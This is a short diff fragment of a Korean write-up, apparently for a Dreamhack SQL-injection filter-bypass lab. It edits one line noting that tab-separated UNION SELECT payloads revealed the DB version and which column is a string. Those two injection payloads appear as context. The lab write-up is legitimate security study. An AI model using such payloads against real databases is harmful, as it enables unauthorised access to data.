@@ -51,7 +51,7 @@ def index():
 '	Union	Select	@@version,null,null#
 '	Union	Select	null,@@version,null#
 ```
-위 구문으로 2번째 컬럼이 문자열이라는 것을 알아 냈다. 또한 DB 버전도 알아냈다.
+- 위 구문으로 2번째 컬럼이 문자열이라는 것을 알아 냈다. 또한 DB 버전도 알아냈다.
 > ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/62084023-65c8-4edd-8eff-d695daeeef5b)
 > ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/5a292eba-c7ad-41fb-949f-ce037602a4bd)
 
